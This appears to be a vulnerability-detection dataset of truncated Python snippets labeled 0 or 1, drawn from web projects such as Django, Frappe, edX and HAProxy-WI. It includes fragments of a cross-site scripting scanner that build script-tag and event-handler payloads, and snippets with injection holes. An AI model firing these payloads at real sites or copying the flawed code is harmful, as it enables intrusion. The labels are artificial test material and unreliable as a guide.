{"snippet_id": 46428, "code": ", owner=request.user, name=collection['name'], description=collection['label'], extra='search-dashboard') dashboard_doc.update_data({ 'collection': collection, 'layout': layout }) dashboard_doc1=dashboard_doc", "label": 0}, {"snippet_id": 33014, "code": "', content_type) self.end_headers() def _WriteTemplate(self, template): contents=self._Read(os.path.join('tools', 'md_browser', template), relative_to=SRC_DIR) self.wfile.write(contents.encode('utf-8')", "label": 0}, {"snippet_id": 51508, "code": "'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.locale.LocaleMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib", "label": 0}, {"snippet_id": 14611, "code": "{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str=", "label": 0}, {"snippet_id": 37555, "code": " \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from", "label": 0}, {"snippet_id": 10513, "code": ": suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self", "label": 0}, {"snippet_id": 27189, "code": " re.M|re.I) m_action =re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\ m_reqtype =re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I) if m_action or m_same: has_form=1 form_counter+=1 if", "label": 1}, {"snippet_id": 23259, "code": "/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch", "label": 0}, {"snippet_id": 3971, "code": " attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss", "label": 0}, {"snippet_id": 35115, "code": "\t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname", "label": 0}, {"snippet_id": 30946, "code": "\tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols']) \ttemplate=env.get_template('config_show.html') \t \ttemplate=template.render(conf=conf, view=form.getvalue", "label": 1}, {"snippet_id": 17775, "code": ".password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls'", "label": 0}, {"snippet_id": 12719, "code": " include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$'", "label": 0}, {"snippet_id": 30270, "code": "'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', \t\t'Accept-Language': 'en-US,en;q=0.5', \t\t'Accept-Encoding': 'gzip, deflate' \t} \tq=requests.post('http://'+serv+':'+stats_port", "label": 0}, {"snippet_id": 48283, "code": "/admin\" if \"rid\" not in request.GET: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") u: Profile=get_current_user(request) current_reservation=GroupReservation.objects", "label": 0}, {"snippet_id": 6487, "code": " session, they will get SAML assertions made without having to authenticate again(unless SP requires it through ForceAuthn). The total time a user can access a particular SP would therefor be this value", "label": 0}, {"snippet_id": 5226, "code": " payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload", "label": 0}, {"snippet_id": 24746, "code": " `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy", "label": 0}, {"snippet_id": 10941, "code": " verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity", "label": 0}, {"snippet_id": 36410, "code": "\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor", "label": 0}, {"snippet_id": 8359, "code": "(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings", "label": 0}, {"snippet_id": 34534, "code": "\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc", "label": 0}, {"snippet_id": 33549, "code": ":140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t", "label": 0}, {"snippet_id": 41842, "code": "\t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for", "label": 0}, {"snippet_id": 49093, "code": ".current_columns.index(self.column_id) +1 def is_ordered(self): return self.column_id in self.current_columns def is_reverse(self): for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)=", "label": 0}, {"snippet_id": 20754, "code": "'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth", "label": 0}, {"snippet_id": 43416, "code": "=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self", "label": 1}, {"snippet_id": 2099, "code": "\"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body", "label": 0}, {"snippet_id": 24714, "code": ".start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in", "label": 0}, {"snippet_id": 4470, "code": "\\u051D', 'x': '\\u0445', 'y': '\\u0443', } def __init__(self): super(Code, self).__init__() @staticmethod def fuzzAscii(): for i in xrange(256): yield chr(i) @staticmethod def fuzzUnicode(cnt=1): for i in", "label": 0}, {"snippet_id": 39311, "code": " \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into", "label": 0}, {"snippet_id": 24063, "code": ") ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self", "label": 0}, {"snippet_id": 28170, "code": "=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\" if serv is not None and form.getvalue('open') is not None: \t \ttry: \t\tfunct.logging(serv, \"config.py open config\") \texcept: \t\tpass \t \terror=funct", "label": 0}, {"snippet_id": 25978, "code": "'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id', 'internal_reference', 'beneficiary') widgets={ 'is_business': BusinessBooleanRadio, 'street': forms.Textarea(attrs={'rows': 2, 'placeholder", "label": 0}, {"snippet_id": 39091, "code": "(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname", "label": 0}, {"snippet_id": 18464, "code": "/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url", "label": 0}, {"snippet_id": 13107, "code": "', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', ", "label": 0}, {"snippet_id": 50553, "code": " mechanism to avoid sending data unless there is actual data available. Args: request(Request): Incoming request. \"\"\" dmode=request.args.get('mode',[None])[0] if dmode=='init': return self.mode_init(request)", "label": 0}, {"snippet_id": 50248, "code": " request): \"\"\" This is called by render_POST when the client requests an init mode operation(at startup) Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] remote_addr", "label": 1}, {"snippet_id": 45226, "code": " else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator", "label": 0}, {"snippet_id": 28955, "code": "=get_data('date_in_log') \tcmd=\"/bin/diff -ub %s %s\" %(oldcfg, cfg) \t \toutput, stderr=subprocess_execute(cmd) \t \tfor line in output: \t\tdiff +=date +\" \" +line +\"\\n\" \ttry:\t\t \t\tlog=open(log_path +\"/config_edit-", "label": 0}, {"snippet_id": 4014, "code": " uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload", "label": 0}, {"snippet_id": 28303, "code": "\t\trole=role, \t\t\t\t\t\t\taction=\"config.py\", \t\t\t\t\t\t\tuser=user, \t\t\t\t\t\t\tselect_id=\"serv\", \t\t\t\t\t\t\tserv=serv, \t\t\t\t\t\t\taftersave=aftersave, \t\t\t\t\t\t\tconfig=config_read, \t\t\t\t\t\t\tcfg=cfg, \t\t\t\t\t\t\tselects=servers, \t\t\t\t\t", "label": 0}, {"snippet_id": 927, "code": "=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) xss_result", "label": 1}, {"snippet_id": 36617, "code": "=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title)", "label": 0}, {"snippet_id": 31614, "code": "\ttooltips=[ \t\t\t\t(\"Connections\", \"@conn\"), \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['conn'", "label": 0}, {"snippet_id": 54508, "code": " render_to_response from django.views.generic import ListView, DetailView from django.views.generic.edit import FormView, CreateView, DeleteView, UpdateView, FormMixin from markdown import markdown from.models", "label": 0}, {"snippet_id": 48648, "code": "=False r.open=True r.pickupDate=datetime.datetime.now() else: return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\") if request.POST.get(\"notes\"): r.notes=request.POST[\"notes\"] if request", "label": 0}, {"snippet_id": 32929, "code": " bold[0], f, bold[1])) self.wfile.write('<br/>\\n') for d in sorted(dirs): if d.startswith('.'): continue self.wfile.write('<a href=\"%s/%s\">%s/</a><br/>\\n' % (self.path.rstrip('/'), d, d)) break self.wfile", "label": 1}, {"snippet_id": 32586, "code": ".path.exists(full_path): self._DoNotFound() elif path.lower().endswith('.md'): self._DoMD(path) elif os.path.exists(full_path +'/README.md'): self._DoMD(path +'/README.md') elif path.lower().endswith('", "label": 0}, {"snippet_id": 52612, "code": "'hdfs://', '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2) if node_data['type'] in(", "label": 0}, {"snippet_id": 7050, "code": "]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views", "label": 0}, {"snippet_id": 23289, "code": "<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses", "label": 0}, {"snippet_id": 17306, "code": ".gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), )", "label": 0}, {"snippet_id": 39127, "code": ".__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None ", "label": 0}, {"snippet_id": 22991, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor", "label": 0}, {"snippet_id": 12129, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index", "label": 1}, {"snippet_id": 25749, "code": " initial else None, ) elif q.type==Question.TYPE_TEXT: field=forms.CharField( label=q.question, required=q.required, help_text=help_text, widget=forms.Textarea, initial=initial.answer if initial else None, )", "label": 0}, {"snippet_id": 16032, "code": " import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES", "label": 0}, {"snippet_id": 8219, "code": "'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth", "label": 0}, {"snippet_id": 47705, "code": "-64 w3-twothird w3-container admin-popup\">' a +=f.render_html(http_request) a +=\"</div>\" return a def check_password_conformity(pw1: str, pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return", "label": 0}, {"snippet_id": 24005, "code": " be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format", "label": 0}, {"snippet_id": 53529, "code": "([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')) return redirect(reverse('oozie:list_oozie_bundle", "label": 0}, {"snippet_id": 8449, "code": " patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES", "label": 0}, {"snippet_id": 36640, "code": "(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t", "label": 0}, {"snippet_id": 25541, "code": " order-related questions. This includes the attendee name for admission tickets, if the corresponding setting is enabled, as well as additional questions defined by the organizer. \"\"\" def __init__(self", "label": 0}, {"snippet_id": 31122, "code": "\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \t \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip", "label": 0}, {"snippet_id": 23196, "code": "]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views", "label": 0}, {"snippet_id": 3650, "code": "=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url", "label": 0}, {"snippet_id": 46120, "code": "'collections':[], 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': collection_doc.doc.get().can_write(request.user), 'can_edit_index': can_edit_index", "label": 1}, {"snippet_id": 54746, "code": "\"iPad\", \"iPod\"] for d in devices: if d in useragent: return True return False class ArticleFormView(LoginRequiredMixin, FormView): \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article template_name='post.html' context_object_name", "label": 0}, {"snippet_id": 3992, "code": ".headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['", "label": 0}, {"snippet_id": 41925, "code": "\t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append", "label": 0}, {"snippet_id": 437, "code": "(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test", "label": 0}, {"snippet_id": 1504, "code": "=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods=['POST']) def start_scan(): scanid", "label": 0}, {"snippet_id": 8362, "code": ".view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS')", "label": 0}, {"snippet_id": 48510, "code": ") current_reservation.submitted=True current_reservation.save() res: HttpResponseRedirect=HttpResponseRedirect(forward_url) return res def manipulate_reservation_action(request: HttpRequest, default_foreward_url", "label": 0}, {"snippet_id": 32296, "code": " server_address=(hostname, args.port) s=Server(server_address, top_level) origin='http://' +hostname if args.port !=80: origin +=':%s' % args.port print('Listening on %s/' % origin) thread=None if args.file", "label": 0}, {"snippet_id": 18709, "code": "'ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=", "label": 0}, {"snippet_id": 42011, "code": " remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value:", "label": 0}, {"snippet_id": 27274, "code": ", re.I|re.M) if m: host=m.group(2) else: print \"[-] Can't get host information\" exit() print \"[+] Host acquired \" +host print \"[+] Retrieve page\" try: r=requests.get(url) s=r.content.replace(\">\", \">\\n\"", "label": 0}, {"snippet_id": 7988, "code": ".add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort", "label": 0}, {"snippet_id": 13512, "code": "))), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 51854, "code": ": '%(log_color)s%(asctime)s\\t%(levelname)-8s -' '%(message)s', 'datefmt': '%Y-%m-%d %H:%M', 'log_colors':{ 'DEBUG': 'green', 'INFO': 'white', 'WARNING': 'yellow', 'ERROR': 'red', 'CRITICAL': 'bold_red'", "label": 0}, {"snippet_id": 20325, "code": "\"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), ", "label": 0}, {"snippet_id": 33749, "code": ".form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe", "label": 1}, {"snippet_id": 51517, "code": ".common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware", "label": 0}, {"snippet_id": 17761, "code": "(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete", "label": 0}, {"snippet_id": 54542, "code": "'category', 'content'] class CommentForm(forms.ModelForm): class Meta: model=Comment fields=['content'] class UserDetail(DetailView): model=User template_name='user.html' def get_context_data(self, **kwargs", "label": 0}, {"snippet_id": 33873, "code": " clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe", "label": 0}, {"snippet_id": 33237, "code": "(gae_users.create_login_url(self.request.url)) self.response.write('build %d not found' % build_id) self.abort(404) return self.redirect(str(build.url)) class TaskCancelSwarmingTask(webapp2.RequestHandler): \"\"", "label": 1}, {"snippet_id": 5416, "code": ", 'onerror', 'onfocus', 'onfocusin', 'onfocusout', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmessage'", "label": 0}, {"snippet_id": 720, "code": "\"param to test\",key parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url", "label": 1}, {"snippet_id": 3341, "code": "%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body,", "label": 0}, {"snippet_id": 39915, "code": ".get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue", "label": 0}, {"snippet_id": 23738, "code": "--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules", "label": 0}, {"snippet_id": 5241, "code": " _tags=[ 'a', 'abbr', 'acronym', 'address', 'applet', 'area', 'article', 'aside', 'audio', 'b', 'base', 'basefont', 'bdi', 'bdo', 'bgsound', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas", "label": 0}, {"snippet_id": 24053, "code": " num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color", "label": 0}, {"snippet_id": 31516, "code": ".SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_waf_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp", "label": 0}, {"snippet_id": 15225, "code": " the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies", "label": 0}, {"snippet_id": 13357, "code": "'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r", "label": 0}, {"snippet_id": 42372, "code": ".as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in", "label": 0}, {"snippet_id": 19029, "code": "'RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops", "label": 0}, {"snippet_id": 54030, "code": " install: bane\") sys.exit() class sc(threading.Thread): def run(self): global stop ti=time.time() print(\"=\"*25) print(\"\\n[*]Target:{}\\n[*]Date:{}\".format(target.get(),datetime.now().strftime(\"%d/%m/%Y %H:%M:", "label": 0}, {"snippet_id": 21997, "code": "'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]", "label": 0}, {"snippet_id": 6327, "code": ".config.getint(self.section, 'listen_port') @property def pysaml2_config(self): \"\"\" pysaml2 configuration file. Separate config file with SAML related parameters. \"\"\" return self.config.get(self.section", "label": 0}, {"snippet_id": 32841, "code": ".path) def _DoUnknown(self): self._WriteHeader('text/html', status_code=501) self.wfile.write('<html><body>I do not know how to serve %s.</body>' '</html>' % self.path) def _DoDirListing(self, full_path)", "label": 0}, {"snippet_id": 50887, "code": " name. *args(any): Remaining args will be arguments for `cmd`. Kwargs: options(dict): These are ignored for oob commands. Use command arguments(which can hold dicts) to send instructions to the client instead", "label": 0}, {"snippet_id": 53276, "code": ", mapping).deploy() properties={'wf_application_path': request.fs.get_hdfs_path(wf_dir)} properties.update(mapping) submission=Submission(request.user, coordinator, request.fs, request.jt, properties=properties", "label": 0}, {"snippet_id": 48524, "code": "(request: HttpRequest, default_foreward_url: str): \"\"\" This function is used to alter the reservation beeing build inside a cookie. This function automatically crafts the required response. \"\"\" js_string: str", "label": 0}, {"snippet_id": 21593, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P", "label": 0}, {"snippet_id": 29629, "code": " line: \t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\") \ttry:\t \t\tssh.close() \texcept: \t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"+str(ssh)+\"<a title='Close' id='errorMess'", "label": 0}, {"snippet_id": 17316, "code": "( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id", "label": 0}, {"snippet_id": 30171, "code": ".ssh_command(serv, commands)\t\t \t\tprint(\"HAproxy was %s\" % action) \telse: \t\tprint(\"Bad config, check please\") \t if form.getvalue('action_waf') is not None and serv is not None: \tserv=form.getvalue('serv') \taction", "label": 0}, {"snippet_id": 17161, "code": ", url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 6219, "code": "\"\"\" Path to CherryPy logfiles(string). Something like '/var/log/idp' maybe. \"\"\" res=self.config.get(self.section, 'logdir') if not res: res=None return res @property def logfile(self): \"\"\" Path to application", "label": 0}, {"snippet_id": 36302, "code": "\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t", "label": 0}, {"snippet_id": 42590, "code": "\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self", "label": 0}, {"snippet_id": 38647, "code": "(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: ", "label": 0}, {"snippet_id": 2798, "code": "(xss_request_url.headers) 